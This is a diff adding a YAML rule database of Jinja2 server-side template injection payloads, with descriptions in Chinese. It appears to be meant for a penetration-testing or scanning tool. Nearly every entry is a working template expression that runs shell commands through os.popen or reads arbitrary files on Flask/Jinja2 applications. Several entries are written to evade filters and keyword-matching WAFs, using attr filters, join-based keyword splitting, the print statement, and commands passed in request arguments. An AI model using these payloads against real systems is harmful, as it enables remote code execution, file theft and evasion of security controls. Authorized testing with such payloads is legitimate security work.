@@ -1,0 +1,266 @@
+ruleDB: v0.1.0
+# Jinja2 模板注入。定界符固定为 {{ }}，所以每条都声明 syntax_lang: jinja2，
+# 运行期能真做语法校验（模板引擎里只有 Jinja2 有可靠 parser）。
+
+templates:
+  - id: ssti.jinja2.rce.config
+    name: Jinja2 经 config 命令执行
+    desc: 最常见的 Jinja2 RCE 路径，经 config 拿到 globals 再取 os
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [flask]
+    version: "*"
+    syntax_lang: jinja2
+    body: "{{config.__class__.__init__.__globals__['os'].popen('<<cmd>>').read()}}"
+    vars: [cmd]
+    requires: [recon, template-ctrl]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: ssti.jinja2.rce.lipsum
+    name: Jinja2 经 lipsum 命令执行
+    desc: config 不可用时的替代，lipsum 是 Jinja2 内置全局函数
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: []
+    version: "*"
+    syntax_lang: jinja2
+    body: "{{lipsum.__globals__['os'].popen('<<cmd>>').read()}}"
+    vars: [cmd]
+    requires: []
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: ssti.jinja2.rce.cycler
+    name: Jinja2 经 cycler 命令执行
+    desc: 同 lipsum，另一个内置全局
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: []
+    version: "*"
+    syntax_lang: jinja2
+    body: "{{cycler.__init__.__globals__.os.popen('<<cmd>>').read()}}"
+    vars: [cmd]
+    requires: []
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: ssti.jinja2.rce.request
+    name: Jinja2 经 request 命令执行
+    desc: Flask 上下文里 request 对象可用时走这条
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [flask]
+    version: "*"
+    syntax_lang: jinja2
+    body: "{{request.application.__globals__.__builtins__.__import__('os').popen('<<cmd>>').read()}}"
+    vars: [cmd]
+    requires: [recon]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: ssti.jinja2.rce.subclasses
+    name: Jinja2 经 subclasses 命令执行
+    desc: 通杀路径，需要先枚举下标找到 os._wrap_close
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: []
+    version: "*"
+    syntax_lang: jinja2
+    slots:
+      idx: {options: ["0", "1", "2", "3", "4", "5", "100", "200", "300"], default: "0"}
+    body: "{{''.__class__.__mro__[1].__subclasses__()[<<idx>>].__init__.__globals__['os'].popen('<<cmd>>').read()}}"
+    vars: [cmd]
+    requires: [recon]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: ssti.jinja2.rce.attr
+    name: Jinja2 经 attr 过滤器命令执行
+    desc: 点号和下划线被过滤时，用 attr 过滤器拼出同样的属性链
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: []
+    version: "*"
+    syntax_lang: jinja2
+    body: "{{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(<<idx>>)|attr('__init__')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('<<cmd>>')|attr('read')()}}"
+    vars: [cmd]
+    slots:
+      idx: {options: ["0", "1", "2", "3", "4", "5", "100", "200", "300"], default: "0"}
+    requires: [weak-filter, recon]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: ssti.jinja2.stmt.set
+    name: Jinja2 用 {% set %} 中转
+    desc: 表达式里禁函数调用时，用 set 把对象取出来再调
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: []
+    version: "*"
+    syntax_lang: jinja2
+    body: "{%set o=cycler.__init__.__globals__.os%}{{o.popen('<<cmd>>').read()}}"
+    vars: [cmd]
+    requires: []
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: ssti.jinja2.file.read
+    name: Jinja2 读文件
+    desc: 只想读文件时用它，不依赖 config / lipsum 这些全局对象。它经 get_flashed_messages 的 globals 拿 builtins，Flask 环境下才有这个函数
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: []
+    version: "*"
+    syntax_lang: jinja2
+    body: "{{get_flashed_messages.__globals__.__builtins__.open('<<filepath>>').read()}}"
+    vars: [filepath]
+    requires: []
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: ssti.jinja2.detect.subclasses
+    name: Jinja2 枚举子类
+    desc: 拿到全部子类列表，从里面找 os._wrap_close 的下标——subclasses 那条载荷的 idx 就是这么来的
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: []
+    version: "*"
+    syntax_lang: jinja2
+    body: "{{''.__class__.__mro__[1].__subclasses__()}}"
+    vars: []
+    requires: []
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: ssti.jinja2.rce.self
+    name: Jinja2 经 self 命令执行
+    desc: config / lipsum / cycler 都被拦时的另一条路。self 是模板对象本身
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: []
+    version: "*"
+    syntax_lang: jinja2
+    body: "{{self.__init__.__globals__.__builtins__.__import__('os').popen('<<cmd>>').read()}}"
+    vars: [cmd]
+    requires: [recon]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: ssti.jinja2.rce.attr.lipsum
+    name: Jinja2 经 attr 过滤器（lipsum）
+    desc: 点号和下划线都被过滤时用 attr 过滤器拼属性链。比 subclasses 版少一步取下标，更稳
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: []
+    version: "*"
+    syntax_lang: jinja2
+    body: "{{lipsum|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('<<cmd>>')|attr('read')()}}"
+    vars: [cmd]
+    requires: [weak-filter]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: ssti.jinja2.rce.request.args
+    name: Jinja2 命令走请求参数
+    desc: 载荷里完全不出现命令本身，命令从 ?c= 里取——绕基于关键字匹配的 WAF 很有效
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: [flask]
+    version: "*"
+    syntax_lang: jinja2
+    body: "{{request.application.__globals__.__builtins__.__import__('os').popen(request.args.get('c')).read()}}"
+    vars: []
+    requires: [recon]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: ssti.jinja2.rce.subclasses.selectattr
+    name: Jinja2 用 selectattr 定位类（免下标）
+    desc: subclasses 那条**不用**先枚举下标就知道 `os._wrap_close` 是第几个——`selectattr('__name__','equalto','_wrap_close')` 按类名筛出来。目标上 `object.__subclasses__()` 的个数随 Python 版本和已导入模块变，每次都要重新数；这条把那次侦察省掉了。`_wrap_close` 是 CPython 的 io 模块里的类，纯 CPython 才有（PyPy 上没有，会筛出空列表）
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: []
+    version: "*"
+    syntax_lang: jinja2
+    body: "{{''.__class__.__base__.__subclasses__()|selectattr('__name__','equalto','_wrap_close')|first|attr('__init__')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('<<cmd>>')|attr('read')()}}"
+    vars: [cmd]
+    requires: []
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: ssti.jinja2.rce.attr.mixed
+    name: Jinja2 经 attr 与下标混用
+    desc: 点号被过滤、但 `[ ]` 还能用（或反过来）时用这条：属性链走 `|attr`，取下标和取字典键走 `[ ]`。和纯 attr 那两条的区别是**对 `[` `]` 的容忍度**——有的过滤只拦点号不拦方括号，有的反过来，这条两边都用上，任何一边可用就能走通。注意 Jinja2 里 `[ ]` 不能直接跟在一个过滤器后面（`x|attr('y')['z']` 是语法错误），必须先括号起来
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: []
+    version: "*"
+    syntax_lang: jinja2
+    slots:
+      idx: {options: ["0", "1", "2", "3", "4", "5", "100", "200", "300"], default: "0"}
+    body: "{{(((''|attr('__class__')|attr('__base__')|attr('__subclasses__')())[<<idx>>]|attr('__init__')|attr('__globals__'))['os']|attr('popen')('<<cmd>>')|attr('read')())}}"
+    vars: [cmd]
+    requires: [weak-filter, recon]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: ssti.jinja2.stmt.print
+    name: Jinja2 用 {% print %} 输出
+    desc: 应用把 `{{ }}` 转义掉、或过滤只拦 `{{` 时用——`{% print %} ` 是 Jinja2 的**语句**形式，和 `{{ }}` 走同一条求值路径、输出同一个值，但源码里没有双花括号。注意 `{%` 后面要留一个空格，`{%print%}` 同样合法但不同版本解析有差异，带上空格最稳
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: []
+    version: "*"
+    syntax_lang: jinja2
+    body: "{% print(cycler.__init__.__globals__.os.popen('<<cmd>>').read()) %}"
+    vars: [cmd]
+    requires: [weak-filter]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: ssti.jinja2.rce.join
+    name: Jinja2 用 join 过滤器拼关键字
+    desc: 下划线、点号都能用，但过滤会里按**字面串**匹配 `__globals__`、`popen` 这类关键字时用这条：把关键字拆成字符列表再用 `|join` 拼回来，载荷里没有任何一处出现完整的关键字。构造任意标识符都行——要读别的属性就照着 `['__','globals','__']|join` 的形式改
+    vuln: [ssti]
+    content_type: [template-expression]
+    component: []
+    version: "*"
+    syntax_lang: jinja2
+    body: "{{lipsum|attr(['__','globals','__']|join)|attr('__getitem__')(['o','s']|join)|attr(['po','pen']|join)('<<cmd>>')|attr(['re','ad']|join)()}}"
+    vars: [cmd]
+    requires: [weak-filter]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
